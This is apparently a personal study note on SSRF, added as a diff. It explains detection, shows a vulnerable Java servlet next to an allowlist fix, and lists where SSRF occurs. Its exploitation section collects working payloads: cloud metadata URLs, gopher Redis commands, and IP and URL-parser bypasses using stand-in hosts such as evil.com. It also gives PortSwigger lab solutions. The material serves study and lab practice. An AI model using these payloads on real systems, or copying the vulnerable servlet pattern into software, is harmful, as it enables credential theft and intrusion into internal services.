@@ -1,0 +1,250 @@
+# 1) what is SSRF 
+
+	│
+	├── Definition
+	│   ├── Server makes HTTP request on behalf of attacker
+	│   ├── Attacker controls destination (URL)
+	│   ├── Exploit internal network that attacker can't access directly
+	│   └── Often leads to port discovery, metadata theft, RCE (depending on service)
+	│
+	├── Core Idea
+	│   ├── Server trusts internal network (127.0.0.1, 169.254.169.254)
+	│   ├── Server-side code reads remote content blindly
+	│   └── Attacker injects internal/private URLs
+	│
+	└── Key Targets
+	    ├── Cloud metadata endpoints (AWS, GCP, Azure)
+	    ├── Internal admin panels
+	    ├── Redis/Memcached/Elasticsearch
+	    └── File://, gopher://, dict://
+	
+
+
+
+# 2) How to Detect SSRF (Deep & Practical)
+
+	
+	SSRF - Detection
+	│
+	├── Input Vectors
+	│   ├── Parameters containing: url, link, target, webhook, endpoint
+	│   ├── File fetchers: /fetch?url=
+	│   ├── Proxy endpoints: /proxy?dest=
+	│   └── Importers: /import?feed=
+	│
+	├── Active Detection
+	│   ├── Inject external URL pointing to Burp Collaborator
+	│   │   └── https://<your-collab>
+	│   ├── Look for outgoing request on backend → means SSRF exists
+	│   ├── Use DNS (OAST) payloads:
+	│   │   └── http://<sub>.burpcollaborator.net
+	│   ├── If web app displays response content → confirmed "Basic SSRF"
+	│   └── If web app doesn't show content → test for "Blind SSRF"
+	│
+	├── Blind Detection
+	│   ├── Time-based (waiting delay)
+	│   │   └── http://10.0.0.1:81 → unreachable → 10s delay
+	│   ├── Port scan through timing differences
+	│   └── DNS exfil (collaborator)
+	│
+	├── Network Discovery
+	│   ├── Inject internal targets:
+	│   │   ├── http://127.0.0.1
+	│   │   ├── http://localhost
+	│   │   ├── http://10.0.0.1
+	│   │   └── http://169.254.169.254
+	│
+	└── Error-Based Detection
+	    ├── Errors like: "Connection refused", "Timeout", "Cannot resolve host"
+	    ├── Means request reached some internal component
+	    └── Important on Java apps (OkHttp errors reveal internal structure)
+
+		try:
+		1- localhost,127.0.0.1
+		2- brute-force on 192.168.0.X:ports/admin
+		
+
+# 3) Source Code
+
+before (vulnerable):
+
+import java.io.*;
+import java.net.*;
+import javax.servlet.*;
+import javax.servlet.http.*;
+
+public class SSRFVulnerable extends HttpServlet {
+
+    protected void doGet(HttpServletRequest request, HttpServletResponse response)
+            throws ServletException, IOException {
+
+        String target = request.getParameter("url"); // attacker-controlled
+
+        URL url = new URL(target);
+        BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
+
+        String inputLine;
+        while ((inputLine = in.readLine()) != null) {
+            response.getWriter().println(inputLine);
+        }
+
+        in.close();
+    }
+}
+
+
+-----------------
+
+after (fixed): 
+
+import java.io.*;
+import java.net.*;
+import javax.servlet.*;
+import javax.servlet.http.*;
+import java.util.*;
+
+public class SSRFSecure extends HttpServlet {
+
+    private static final Set<String> ALLOWED_HOSTS = Set.of(
+            "example.com",
+            "cdn.example.com"
+    );
+
+    private boolean isAllowed(URL url) {
+        String host = url.getHost().toLowerCase();
+        return ALLOWED_HOSTS.contains(host);
+    }
+
+    protected void doGet(HttpServletRequest request, HttpServletResponse response)
+            throws ServletException, IOException {
+
+        String target = request.getParameter("url");
+
+        URL url = new URL(target);
+
+        if (!isAllowed(url)) {
+            response.sendError(403, "Forbidden");
+            return;
+        }
+
+        BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
+        String line;
+        while ((line = in.readLine()) != null) {
+            response.getWriter().println(line);
+        }
+        in.close();
+    }
+}
+
+
+# 4) Where Found
+	│
+	├── 1. URL Fetchers
+	│   ├── /fetch?url=http://...
+	│   ├── /proxy?dest=...
+	│   └── /load?image=
+	│
+	├── 2. Webhooks / Callbacks
+	│   ├── /webhook/test?callback=http://...
+	│   └── APIs that “ping” URLs
+	│
+	├── 3. APIs pulling external content
+	│   ├── RSS Import
+	│   ├── PDF Generation from URL
+	│   ├── Screenshot Services
+	│   └── URL Preview cards (like social media)
+	│
+	├── 4. Cloud Services
+	│   ├── AWS metadata
+	│   ├── Azure IMDS
+	│   └── GCP metadata
+	│
+	├── 5. File protocols
+	│   ├── file://
+	│   ├── gopher://
+	│   └── dict://
+	│
+	└── 6. Authentication flows
+	    └── OAuth redirect_uri
+
+
+
+# 5) How to Exploit SSRF (Payloads + Bypasses – FULL LIST)
+
+	SSRF Exploitation
+	│
+	├── Basic Payloads
+	│   ├── http://127.0.0.1/
+	│   ├── http://localhost/
+	│   ├── http://10.0.0.1/
+	│   └── http://internal-service:80/
+	│
+	├── Cloud Metadata
+	│   ├── AWS
+	│   │   └── http://169.254.169.254/latest/meta-data/
+	│   ├── Azure
+	│   │   └── http://169.254.169.254/metadata/instance?api-version=2021-02-01
+	│   └── GCP
+	│       └── http://169.254.169.254/computeMetadata/v1/
+	│
+	├── Port Scanning via SSRF
+	│   ├── http://127.0.0.1:22       → fast refuse
+	│   ├── http://127.0.0.1:3306     → delay
+	│   └── http://127.0.0.1:6379     → banner leak
+	│
+	├── Protocol Abuse
+	│   ├── file://etc/passwd
+	│   ├── dict://127.0.0.1:11211/
+	│   └── gopher://127.0.0.1:6379/_*redis payload*
+	│
+	├── Gopher RCE (Redis Example)
+	│   └── gopher://127.0.0.1:6379/_SET%20x%20pwned
+	│
+	├── Bypass Tricks
+	│   ├── Decimal IP:
+	│   │   └── http://2130706433/      (127.0.0.1)
+	│   ├── Octal IP:
+	│   │   └── http://0177.0.0.1/
+	│   ├── DNS Rebinding:
+	│   │   └── http://attacker-domain.com → resolves to 127.0.0.1
+	│   ├── URL Obfuscation:
+	│   │   └── http://localhost@evil.com/
+	│   ├── Double URL:
+	│   │   └── http://evil.com@127.0.0.1/
+	│   ├── Redirect Bypass:
+	│       ├── http://evil.com → 301 → http://127.0.0.1
+	│   └── Path confusion:
+	│       └── http://127.0.0.1:80#evil.com
+	│
+	└── Advanced Attacks
+	    ├── Reach internal admin dashboards
+	    ├── Reach cloud metadata → steal tokens → pivot
+	    ├── Attack Redis/Elasticsearch unauthenticated ports
+	    └── SSRF → RCE (if service allows command execution)
+
+
+	portswigger :
+	1- stockApi=http://localhost/admin/delete?username=carlos
+	2- stockApi=http://192.168.0.226:8080/admin/delete?username=carlos # portScan
+	3-stockApi=http://127.1/%25%36%31dmin/delete?username=carlos #obfuscate admin to duoble encode  black_list for admin
+	
+    4- IMPORTANT:
+    best writeup:
+    https://blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf 
+    
+	 http://user:pass@hostname/path  | http://anything.com@127.0.0.1
+	(@,#,DNS resolve, url encode for : /)
+	#############################
+	URL Structure: scheme://userinfo@host/path
+	http://localhost:80%2523@stock.weliketoshop.net/admin/delete
+	
+	scheme: http
+	
+	netloc: localhost:80%23@stock.weliketoshop.net |  if parser see invalid in 
+		userinfo remove @ and treat userinfo as host (host = localhost:80%23 -> 
+		host=localhost:80#) the parser dosen't treat # as fragment 'cause 
+		fragment must be after path not in host so parser will ignore it and the 
+		final netloc will be host =localhost:80  | must use %2523
+	path: /admin/delete
+	
+	FINAL: http://localhost:80/admin/delete
